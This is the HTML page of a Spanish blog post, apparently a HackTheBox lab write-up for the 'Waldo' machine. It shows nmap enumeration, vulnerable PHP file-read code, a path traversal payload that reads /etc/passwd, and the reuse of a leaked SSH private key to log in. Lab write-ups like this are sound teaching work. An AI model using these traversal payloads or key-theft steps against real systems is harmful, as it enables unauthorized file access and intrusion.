@@ -1,0 +1,1368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Waldo</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Waldo | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Waldo" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas." />
+<meta property="og:description" content="Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas." />
+<link rel="canonical" href="http://localhost:4000/htb/waldo" />
+<meta property="og:url" content="http://localhost:4000/htb/waldo" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-09T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" />
+<meta property="twitter:title" content="HackTheBox - Waldo" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-09T00:00:00-07:00","datePublished":"2021-08-09T00:00:00-07:00","description":"Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.","headline":"HackTheBox - Waldo","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/waldo"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/waldo"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Waldo</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-09">09 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina linux nivel medio. Los lindos <strong>LFI</strong>, jugueteo con <strong>SSH</strong>, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las <strong>CAPA</strong>cidades <strong>BILITIES</strong>as.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149waldoHTB.png" alt="149waldoHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/1895">strawman</a> &amp; <a href="https://www.hackthebox.eu/profile/35484">capnspacehook</a>.</p>
+
+<p>Juguetona juguetonaaaa.</p>
+
+<p>Inicialmente nos encontraremos un servidor web que nos permite crear listas de ítems, jugando con <code>BurpSuite</code> veremos que dos peticiones están interactuando directamente con archivos del sistema, jugaremos con eso para conseguir <code>LFI (Local File Inclusion)</code> y leer archivos del sistema. Llegaremos a encontrar una llave privada con el nombre de archivo <code>.monitor</code> y algunos usuarios, entre ellos a <code>nobody</code>, testeando la llave privada contra ese usuario lograremos obtener una Shell en un contenedor por medio de <code>SSH</code>.</p>
+
+<p>Dentro veremos que existen dos servicios <code>SSH</code> corriendo, uno en el puerto <code>22</code> y otro en el puerto <code>8888</code> (en este nos conectamos nosotros), con esto en mente y explorando el directorio <code>.ssh</code> llegaremos a otro usuario, uno llamado <code>monitor</code>, jugando de nuevo con la llave privada (que se llama como ese usuario 🤪) y el <strong>SSH local</strong> obtendremos una sesión como él en la máquina host.</p>
+
+<p>Llegaremos y estaremos restringidos con una <code>rbash (restricted bash)</code>, enumerando sabremos que solo podemos ejecutar <code>4</code> comandos, entre ellos <code>ed</code> pero restringido (<code>red</code> de <strong>r</strong>estricted ed). Apoyados en la web veremos que podemos ejecutar comandos estando dentro del editor <code>ed</code>, generaremos una <code>/bin/bash</code> para escapar de la <strong>bash restringida</strong>.</p>
+
+<p>Finalmente viendo que <code>capabilities</code> existen en el sistema encontraremos <code>cap_dac_read search</code> asignada a dos binarios, uno de ellos es <code>tac</code> (<code>cat</code> pero al revés, literal). La capability nos permite bypassear los permisos de lectura que tenga cualquier archivo, por lo que podremos leer objetos del sistema sin restricción.</p>
+
+<p>A pesar de encontrar una <code>id_rsa</code> en el directorio <code>/root</code> no lograremos una sesión como él, esto gracias a la configuración <code>SSH</code> que no permite que el usuario <code>root</code> obtenga una Shell por ese medio :(</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Con vulns conocidas (más o menos) pero algo juguetona, aunque escala a la realidad.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Es momento de beber agua.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Encontramos puertos abiertos con ayuda de nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Recorremos el servidor web sobre el puerto 80</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#lfi">Encontramos <strong>LFI</strong> en el servidor web</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#ssh-8888-22">Movimiento lateral (movimientos sensuales con <strong>SSH</strong>) nobody -&gt; monitor</a>.
+    <ul>
+      <li><a href="#rbash-bypass">Bypasseamos la <strong>Shell restringida</strong> en la que estamos</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Vamos a empezar enumerando los puertos activos de la máquina, así vamos viendo por donde encaminarnos:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.87 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Este escaneo nos devuelve:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Thu Aug  5 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.87
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.87 ()	Status: Up
+Host: 10.10.10.87 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Thu Aug  5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 98.88 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Posibilidad de una Shell de manera segura.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos brinda un servidor web.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Listos, ahora vamos a enfocarnos en escanear las versiones y scripts que estén relacionados con cada servicio:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.87
+    [*] Open ports: 22,80
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80 -sC -sV 10.10.10.87 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y con este escaneo vemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Thu Aug  5 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.87
+Nmap scan report for 10.10.10.87
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
+|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
+|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
+80/tcp open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+| http-title: List Manager
+|_Requested resource was /list.html
+|_http-trane-info: Problem with XML parsing of /evox/about
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Aug  5 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.86 seconds
+</code></pre>
+
+<p>Perefeeeesto, ¿qué podemos destacar?</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.5 (protocol 2.0)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">nginx 1.12.2</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Vemos un archivo llamado <code>list.html</code>, pero poco podemos hacer o entender sobre él, así que empecemos a explorar y ver por donde explotar la máquina.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Una locura de colores y sabores 😁 vemos inicialmente un botón para añadir lista, si damos clic sobre él obtendríamos algo así:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80_addList.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Se nos genera un ítem con el cual podemos interactuar de dos maneras: <code>Delete</code> o inspeccionando su contenido (dando clic en <code>list1</code>):</p>
+
+<ul>
+  <li>Con <code>Delete</code> simplemente lo borramos.</li>
+  <li>Con <code>list1</code> (al dar clic) se nos dan dos opciones más, <code>Add</code> (añadimos un ítem a la lista) y <code>Back</code> para regresar a la lista de listas e.e</li>
+</ul>
+
+<p>Muy lindo ¿pero y queeeeeeeee? Si enumeramos un poquitico más a fondo y leemos el código fuente de la web vemos el llamado a un archivo <code>.js</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80_sourceCode_listHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si nos movemos ahora a ese recurso vemos tooooodas las definiciones interactivas de la web al jugar con las listas y los ítems, el archivo es gigante:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149page80_sourceCode_listJS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, si leemos algunas líneas ya vemos cositas interesantes:</p>
+
+<ul>
+  <li>Peticiones <code>POST</code>.</li>
+  <li>Referencia a archivos:
+    <ul>
+      <li><code>fileWrite.php</code></li>
+      <li><code>fileDelete.php</code></li>
+      <li><code>dirRead.php</code></li>
+      <li><code>fileRead.php</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>Todos con nombres interesantes. Pues abramos <code>BurpSuite</code> e interceptemos esas peticiones <strong>POST</strong>, jugamos con el <code>repeater</code> y vamos acumulando cada petición, finalmente tenemos:</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_tabs_requests.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si nos fijamos de los 4 recursos, hay dos muuuy llamativos, <code>fileRead.php</code> y <code>dirRead.php</code>, inspeccionemos <strong>fileRead.php</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_fileRead_res.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ufff uff ufffff, esa variable <code>file</code> se ve juguetona:</p>
+
+<pre><code class="language-html">file=./.list/list1
+</code></pre>
+
+<p>Al parecer indica que de la ruta actual entre al directorio <code>.list</code> y de él muestre el archivo <code>list1</code>.</p>
+
+<hr />
+
+<h2 id="lfi">Encontramos <strong>LFI</strong> en el servidor web <a href="#lfi">📌</a></h2>
+
+<p>Pues lo primero que se nos viene a la cabeza es intentar un <strong>LFI (Inclusion Local de Archivos)</strong> para ver si de alguna manera logramos enumerar objetos del sistema a los que normalmente no deberíamos tener acceso…</p>
+
+<ul>
+  <li><a href="https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/">¿Cómo funciona una vulnerabilidad Local File Inclusion?</a>.</li>
+</ul>
+
+<p>Si recordamos en nuestro escaneo de <strong>nmap</strong> habíamos visto el archivo <code>list.html</code> (que sería el home), intentemos encontrarlo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_fileRead_findLISThtml_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_fileRead_findLISThtml_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pero claro que siiiiiiiiiiiii, encontramos un <strong>LFI</strong>, peeeeeerfectoooo. Usémoslo para encontrar los <code>.php</code> y ver su contenido:</p>
+
+<pre><code class="language-html">file=./fileRead.php
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_fileRead.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Tomemos su contenido y guardémoslo en un archivo de nuestra máquina, hagamos que los saltos de línea que están como texto (<code>\n</code>) se conviertan en verdaderos saltos de línea y lo mismo con las tabulaciones (<code>\t</code>):</p>
+
+<pre><code class="language-bash">❱ sed -i 's/\\n/\n/g' fileRead.php
+❱ sed -i 's/\\t/\t/g' fileRead.php
+# Este para quitar algunos escapes (\) que hay:
+❱ sed -i 's/\\//g' fileRead.php
+</code></pre>
+
+<p>Obtendríamos ahora si el archivo bien lindo:</p>
+
+<pre><code class="language-php">&lt;?php
+
+if($_SERVER['REQUEST_METHOD'] === "POST"){
+    $fileContent['file'] = false;
+    header('Content-Type: application/json');
+    if(isset($_POST['file'])){
+        header('Content-Type: application/json');
+        $_POST['file'] = str_replace( array("../", ".."), "", $_POST['file']);
+        if(strpos($_POST['file'], "user.txt") === false){
+            $file = fopen("/var/www/html/" . $_POST['file'], "r");
+            $fileContent['file'] = fread($file,filesize($_POST['file']));  
+            fclose();
+        }
+    }
+    echo json_encode($fileContent);
+}
+</code></pre>
+
+<p>Si nos fijamos, hay dos validaciones interesantes:</p>
+
+<ul>
+  <li><code>$_POST['file'] = str_replace( array("../", ".."), "", $_POST['file']);</code>
+    <ul>
+      <li>Lo que hace es tomar el valor de la variable <code>file</code> y si en su contenido existen/encuentra ya sea <code>../</code> o <code>..</code> los remplaza por: `` (vacío).</li>
+    </ul>
+
+    <p>Por lo que si enviamos:</p>
+
+    <pre><code class="language-html">file=../../../etc/passwd
+</code></pre>
+
+    <p>Se convertirá en:</p>
+
+    <pre><code class="language-html">file=etc/passwd
+</code></pre>
+
+    <p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_scriptPHP_example_strReplace.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+    <p>Y abre el archivo dentro de la ruta <code>/var/www/html</code> simplemente con:</p>
+
+    <pre><code class="language-html">$file = fopen("/var/www/html/" . $_POST['file'], "r");
+$fileContent['file'] = fread($file,filesize($_POST['file']));  
+fclose();
+...
+echo json_encode($fileContent);
+</code></pre>
+  </li>
+</ul>
+
+<p>Sabemos que hay un filtro para evitar movernos entre rutas, ¿pero y si intentamos romperlo? Haciendo distintas pruebas llegamos finalmente a esta:</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#filter-bypass-tricks">LFI - Filter bypass tricks</a>.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-php">file=....//....//....//etc/passwd
+</code></pre>
+
+<p>Que se convertirá en:</p>
+
+<pre><code class="language-php">file=///etc/passwd
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_etcPasswd.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>No entiendo muy bien el porque esa cadena nos da la explotación ya que relativamente no es una ruta valida (por los <code>//</code> iniciales), si sabes el porqué, chárlame, quizás estoy obviando algo :)</p>
+</blockquote>
+
+<p>Maravelooooso, tenemos acceso ahora a los archivos del sistema. Si le damos el formato correcto al objeto <code>passwd</code> tendríamos:</p>
+
+<pre><code class="language-bash">root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
+nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
+</code></pre>
+
+<p>Como usuarios interesantes tenemos: <code>root</code>, <code>operator</code> y <code>nobody</code>.</p>
+
+<p>Jugando con algunos archivos por default no encontramos nada más :( acá recaemos en el objeto <code>dirRead.php</code>:</p>
+
+<pre><code class="language-html">file=./dirRead.php
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_fileRead2dirRead.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Hacemos de nuevo el formateo y obtenemos:</p>
+
+<pre><code class="language-php">&lt;?php
+
+if($_SERVER['REQUEST_METHOD'] === "POST"){
+    if(isset($_POST['path'])){
+        header('Content-type: application/json');
+        $_POST['path'] = str_replace( array("../", ".."), "", $_POST['path']);
+        echo json_encode(scandir("/var/www/html/" . $_POST['path']));
+    }else{
+        header('Content-type: application/json');
+        echo '[false]';
+    }
+}
+</code></pre>
+
+<p>En este objeto simplemente toma la variable <code>path</code>, vuelve a validar que no tengan <code>..</code> o <code>../</code> y hace un <code>scandir</code> (como un <code>ls</code>) sobre esa ruta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>O podemos ver tooodos los objetos que usa la web simplemente borrando el directorio <code>.list</code> de la variable:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_list.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ese sería su uso normal, ¿pero y si volvemos a tomar nuestro “payload” con el que vimos archivos del sistema y lo usamos para listar directorios? 👀</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_list_withpayload.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>😄 <strong><em>¿Esa petición es real o solo cambié el valor de la variable <code>path</code> para hacerles creer que funciona?</em></strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_rootsystem.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pues era reaaaaaal, tenemos ahora acceso a listar directorios del sistemaaaaaaaaaaaa (a los que tengamos acceso, claramente 🤭)</p>
+
+<p>Después de movernos entre rutas encontramos este conjunto de directorios:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_home_nobody.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un directorio <code>.ssh</code>, podemos inspeccionarlo a ver si hay llaves de acceso que le permitan a algún usuario ingresar al sistema sin necesidad de colocar contraseñas, esto simplemente conectándose con una llave:</p>
+
+<ul>
+  <li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2">Concepto <strong>SSH Keys</strong></a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_dirRead_home_nobody_ssh.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un objeto llamado <code>.monitor</code> que si intentamos usarlo como directorio nos devuelve un <code>false</code>, por lo que no es un directorio, peeeeeeeeeeero, tenemos por otro lado el archivo para leer objetos del sistema, usémoslo para ver su contenido:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149burp_LFI_fileRead_ssh_monitor.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OPAAAAAAAAAAAAAAAAAA una llave <strong>SSH</strong> privada, pues pasémosla a nuestro sistema, démosle el formato lindo e intentemos usarla contra el sistema víctima, quizás es funcional para algún usuario actual.</p>
+
+<p>Debemos darle los permisos necesarios, así evitamos problemas:</p>
+
+<pre><code class="language-bash">❱ chmod 600 monitor_idRSA
+</code></pre>
+
+<p>Jugando con los usuarios que encontramos antes, si intentamos la conexión como <code>nobody</code> logramos obtener una sesión en el sistema:</p>
+
+<pre><code class="language-bash">❱ ssh nobody@10.10.10.87 -i monitor_idRSA
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_ssh_nobodySH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perfectisiiiiimo, tamos dentrooooo (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149google_gif_go_on.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;" /></p>
+
+<p>…</p>
+
